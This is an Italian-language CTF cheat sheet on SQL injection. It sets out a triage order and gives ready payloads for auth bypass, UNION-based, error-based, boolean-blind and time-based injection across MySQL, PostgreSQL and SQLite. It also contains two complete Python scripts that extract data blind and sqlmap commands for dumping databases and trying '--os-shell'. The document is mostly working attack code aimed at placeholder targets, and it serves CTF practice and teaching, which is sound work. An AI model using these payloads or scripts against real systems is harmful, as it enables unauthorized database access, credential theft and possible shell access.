# 02. SQL Injection (SQLi)

> [!abstract] Triage SQLi (Ordine di Attacco)
> 1. **Testa il contesto sintattico**: prova `'`, `"`, `')`, `\`, `1-0`, `1/0`. Osserva errori SQL, status `500`, o cambiamenti nel contenuto della risposta.
> 2. **Login / Form**: prova Auth Bypass (`' OR 1=1 -- -`, `admin' -- -`).
> 3. **Output visibile in pagina**: usa **UNION-based SQLi** (`ORDER BY` → `UNION SELECT`).
> 4. **Nessun dato in pagina, ma errori SQL mostrati**: usa **Error-based SQLi** (`EXTRACTVALUE` / `UPDATEXML`).
> 5. **Nessun dato e nessun errore, ma la pagina cambia (vero/falso)**: usa **Boolean Blind SQLi** (script Python).
> 6. **La pagina risponde sempre uguale**: usa **Time-based Blind SQLi** (`SLEEP()` / `pg_sleep()`).

---

## 1. Auth Bypass & Detection

**Trigger**: Form di login (`username`/`password`), filtri o parametri numerici/stringa passati a query SQL.

### Payload di Detection e Bypass
```sql
'
"
' OR 1=1 -- -
" OR 1=1 -- -
' OR '1'='1
admin' -- -
admin' #
') OR ('1'='1
```

> [!warning] Commenti SQL: spazio dopo `--`!
> In **MySQL / MariaDB**, `--` inizia un commento **solo se seguito da uno spazio** (o tab/newline). Per evitare che i browser o il copia-incolla rimuovano lo spazio finale, si scrive `-- -` (oppure `#`, codificato in URL come `%23`). In **SQLite / PostgreSQL** basta `--`.

---

## 2. UNION-Based SQLi (`web 18`)

**Trigger**: I risultati della query vengono stampati direttamente nella pagina HTML (es. barra di ricerca, dettaglio articolo `?id=1`).

### Procedura in 4 Step
1. **Trova il numero di colonne** (incrementa finché sparisce l'errore / cambia la risposta):
   ```sql
   ' ORDER BY 1 -- -
   ' ORDER BY 6 -- -
   -- oppure:
   ' UNION SELECT 1,2,3,4,5,6 -- -
   ```
2. **Trova le colonne stampate** (e compatibili con tipo stringa): sostituisci ai numeri delle stringhe o espressioni, vedi quali numeri compaiono in pagina.
3. **Enumera tabelle e colonne** (MySQL/MariaDB):
   ```sql
   -- Tutte le tabelle (escludendo quelle di sistema)
   ' UNION SELECT table_name,table_schema,3,4,5,6 FROM information_schema.tables WHERE table_schema=database() -- -

   -- Tutte le colonne di una tabella specifica
   ' UNION SELECT column_name,table_name,3,4,5,6 FROM information_schema.columns WHERE table_name='real_data' -- -
   ```
4. **Estrai i dati (usa `GROUP_CONCAT` se stampa una sola riga)**:
   ```sql
   ' UNION SELECT GROUP_CONCAT(flag),2,3,4,5,6 FROM real_data -- -
   ```

> [!tip] Se lo spazio ` ` viene filtrato o il valore `id=1` blocca la stampa
> - Usa `id=-1` o `id=99999` davanti a `UNION SELECT` in modo che la prima query non restituisca righe e venga stampata la tua riga iniettata.
> - Se gli spazi sono bloccati, sostituiscili con `/**/` (`'/**/UNION/**/SELECT...`).

---

## 3. Error-Based SQLi (MySQL)

**Trigger**: Nessun risultato della `SELECT` viene mostrato a schermo, ma l'applicazione stampa l'errore restituito dal database (o lo trovi nella risposta HTTP).

### Payload XML (MySQL / MariaDB)
`EXTRACTVALUE` e `UPDATEXML` generano un errore XPath che include il risultato della sottoquery (troncato a ~32 caratteri per volta; usa `SUBSTR(..., offset, 30)` se lungo):

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()))) -- -
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- -
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT flag FROM real_data LIMIT 1)), 1) -- -
```
*(Nota: `0x7e` è `~`, forza l'errore di sintassi XPath. In URL-encoded `#` diventa `%23`.)*

---

## 4. Boolean-Based Blind SQLi (`web 19`)

**Trigger**: La query non stampa risultati né errori, ma la risposta varia in modo binario (es. `"Utente trovato"` vs `"Nessun risultato"`, oppure status `200` vs `404`).

### Concetti chiave e uso di `HEX()` + `LIKE`
- **`SQL LIKE`**: cerca pattern nel `WHERE` (`%` = 0 o più caratteri; `_` = **esattamente 1 carattere**).
  - Esempio: `SELECT * FROM Customers WHERE CustomerName LIKE 'a%';`
- **Perché estrarre usando `HEX(...)`?**
  1. In MySQL `LIKE` è **case-insensitive** di default (`'a%'` matcha sia `'a'` che `'A'`).
  2. Il carattere `_` dentro una flag (es. `flag{ciao_mondo}`) verrebbe interpretato come wildcard da `LIKE`!
  3. L'output di `HEX()` usa **solo** `[0-9a-fA-F]`, quindi distingue perfettamente maiuscole, minuscole e `_` senza ambiguità.

### Template SQL
```sql
-- Verifica controllo booleano (con apice aperto a sinistra e chiuso a destra):
1' AND (SELECT 1 WHERE 1=1)='1
1' AND (SELECT 1 WHERE HEX('SECRET') LIKE '53%')='1

-- Query risultante lato server:
SELECT * FROM main WHERE id='1' AND (SELECT 1 WHERE HEX(secret) LIKE '53%')='1'
```

### Script Python Pronto (Boolean Blind con `HEX`)

```python
import requests

URL = "http://TARGET/api/blind"

def is_true(payload: str) -> bool:
    r = requests.get(URL, params={"id": payload})
    # ADATTA QUESTA CONDIZIONE alla sfida (es. parola presente, len(r.text), status_code)
    return "Success" in r.text

hex_result = ""
while True:
    found = False
    for c in "0123456789abcdef":
        guess = hex_result + c
        # Adatta tabella/colonna e sintassi di chiusura apici
        payload = f"1' AND (SELECT 1 FROM flags WHERE HEX(flag) LIKE '{guess}%')='1"
        if is_true(payload):
            hex_result += c
            found = True
            if len(hex_result) % 2 == 0:
                print(bytes.fromhex(hex_result).decode(errors="ignore"))
            break
    if not found:
        break

print("Risultato finale:", bytes.fromhex(hex_result).decode())
```

---

## 5. Time-Based Blind SQLi (`web 20`)

**Trigger**: La risposta HTTP è **identica** (stesso testo, stesso status code) sia per query vere che per query false. L'unico canale laterale è il **tempo di risposta**.

### Payload per DBMS
- **MySQL / MariaDB**:
  ```sql
  1' AND IF(SUBSTR(HEX((SELECT flag FROM flags LIMIT 1)), 1, 1)='6', SLEEP(2), 0) -- -
  ```
- **PostgreSQL**:
  ```sql
  1'; SELECT CASE WHEN (SUBSTR(flag,1,1)='f') THEN pg_sleep(2) ELSE pg_sleep(0) END --
  ```
- **SQLite** (non ha `SLEEP`, si usa un'operazione pesante come `randomblob`):
  ```sql
  1' AND (CASE WHEN (SUBSTR(hex(flag),1,1)='6') THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000)))) ELSE 1 END) --
  ```

### Script Python Pronto (Time-Based con Binary Search sui bit/caratteri)

```python
import requests
import time

URL = "http://TARGET/api/time"
DELAY = 1.5  # Secondi di sleep nella query SQL

def check_time(payload: str) -> bool:
    t0 = time.monotonic()
    r = requests.post(URL, json={"query": payload})
    return (time.monotonic() - t0) >= DELAY

# Estrazione carattere per carattere con ricerca binaria su ASCII (32..126) -> max 7 richieste/char!
extracted = ""
pos = 1
while True:
    low, high = 32, 126
    # Controlla prima se esiste un carattere alla posizione pos
    if not check_time(f"1' AND IF(ASCII(SUBSTR((SELECT flag FROM flags LIMIT 1),{pos},1))>0, SLEEP({DELAY}), 0) -- -"):
        break
    while low < high:
        mid = (low + high + 1) // 2
        payload = f"1' AND IF(ASCII(SUBSTR((SELECT flag FROM flags LIMIT 1),{pos},1))>={mid}, SLEEP({DELAY}), 0) -- -"
        if check_time(payload):
            low = mid
        else:
            high = mid - 1
    extracted += chr(low)
    print(f"[{pos}] {extracted}")
    pos += 1
```

> [!warning] Trappola nella Time-Based
> Usa sempre la **ricerca binaria** (`ASCII(...) >= mid`) se il tempo di sleep è $\ge 1$ secondo: invece di fare 60-90 richieste a carattere (minuti), ne fai al massimo **7 per carattere**!

---

## 6. Confronto Rapido DBMS (MySQL vs SQLite vs PostgreSQL)

| Operazione | MySQL / MariaDB | SQLite | PostgreSQL |
| :--- | :--- | :--- | :--- |
| **Commento inline** | `-- ` (spazio obbligatorio) o `#` | `--` | `--` |
| **Versione** | `VERSION()` o `@@version` | `sqlite_version()` | `version()` |
| **Database / Utente** | `database()`, `user()` | N/A | `current_database()`, `current_user` |
| **Concatenazione stringhe** | `CONCAT(a, b)` | `a \|\| b` | `a \|\| b` |
| **Aggregazione righe** | `GROUP_CONCAT(col)` | `group_concat(col)` | `string_agg(col, ',')` |
| **Lista tabelle** | `SELECT table_name FROM information_schema.tables WHERE table_schema=database()` | `SELECT name FROM sqlite_master WHERE type='table'` | `SELECT tablename FROM pg_tables WHERE schemaname='public'` |
| **Lista colonne** | `SELECT column_name FROM information_schema.columns WHERE table_name='tbl'` | `SELECT sql FROM sqlite_master WHERE name='tbl'` | `SELECT column_name FROM information_schema.columns WHERE table_name='tbl'` |
| **Sleep** | `SLEEP(N)` | `LIKE('A', UPPER(HEX(RANDOMBLOB(100000000))))` | `pg_sleep(N)` |

---

## 7. `sqlmap` (Quando l'estrazione manuale è lunga)

**Trigger**: Hai confermato una SQLi su una macchina o challenge senza protezioni custom (rate-limit/CSRF token rotanti) e vuoi enumerare rapidamente DB e tabelle.

```bash
# 1. Test su parametro GET
sqlmap -u "http://target.local/item?id=1" --batch --dbs

# 2. Da file di richiesta HTTP salvato (es. copiato da Burp Suite o DevTools -> Copy as cURL)
sqlmap -r request.txt --batch --dbs

# 3. Enumera tabelle di un DB e fai dump
sqlmap -u "http://target.local/item?id=1" -D nome_db --tables --batch
sqlmap -u "http://target.local/item?id=1" -D nome_db -T nome_tabella --dump --batch

# 4. Opzioni utili in CTF
# --level=3 --risk=2     (testa anche header/cookie e payload più aggressivi)
# --technique=BEUST      (seleziona Boolean, Error, Union, Stacked, Time)
# --cookie="session=..." (passa cookie di sessione)
# --os-shell             (tenta shell interattiva se i privilegi lo permettono)
```
